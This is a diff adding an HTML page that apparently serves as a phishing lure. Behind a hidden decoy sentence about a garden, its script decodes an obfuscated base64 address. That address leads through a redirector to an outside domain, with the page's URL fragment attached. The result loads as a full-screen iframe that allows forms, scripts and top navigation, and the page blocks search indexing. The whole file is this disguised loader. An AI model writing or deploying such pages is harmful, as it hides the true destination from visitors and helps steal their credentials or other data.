@@ -1,0 +1,37 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>She tended to her flower garden with care.</span>
+ </body>
+<script>
+var fennec = null;
+if(location.hash == ""){
+location.hash = `#X`;
+fennec = `#X`;
+}
+if(location.hash !== ""){
+fennec = location.hash;
+}
+if (location.hash.includes('?')) {
+fennec = location.hash.replace('#', '');
+}
+
+(async () => {
+    var oregano = document.createElement('iframe');
+    oregano.sandbox.add('allow-same-origin');
+    oregano.sandbox.add('allow-top-navigation');
+    oregano.sandbox.add('allow-modals');
+    oregano.sandbox.add('allow-scripts');
+    oregano.sandbox.add('allow-popups-to-escape-sandbox');
+    oregano.sandbox.add('allow-forms');
+    oregano.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL1dmeXkudGVyZ2VudGEuY29tL0hzNHhtLw==")+fennec;
+    oregano.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(oregano);
+    document.body.innerHTML = "";
+    document.body.appendChild(oregano);
+})();
+</script>
+</html>
